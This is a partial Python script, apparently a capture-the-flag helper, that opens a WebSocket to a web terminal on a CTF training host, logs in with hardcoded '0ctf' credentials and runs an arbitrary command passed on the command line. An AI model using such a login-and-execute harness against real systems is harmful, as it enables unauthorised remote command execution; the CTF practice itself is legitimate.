...
URL='ws://oj-10-30-15-2-46537.adworld.xctf.org.cn/ws'
ORIGIN='http://oj-10-30-15-2-46537.adworld.xctf.org.cn'
PROMPTS=[':~$ ','# ','/ $ ','$ ']
cmd=' '.join(sys.argv[1:])
if not cmd:
    print('usage: python host_baseline_exec_cmd.py <command>')
    sys.exit(1)
...
def login_and_run():
    ...
    recv_until(ws,['login:'],8)
    ws.send('0ctf\n')
    recv_until(ws,['Password:'],8)
    ws.send('0ctf\n')
    recv_until(ws,PROMPTS+['Login incorrect'],15)
    time.sleep(0.5)
    ws.send('0'+cmd+'\n')
    out=recv_until(ws,PROMPTS,30)
    ws.close()
    return out
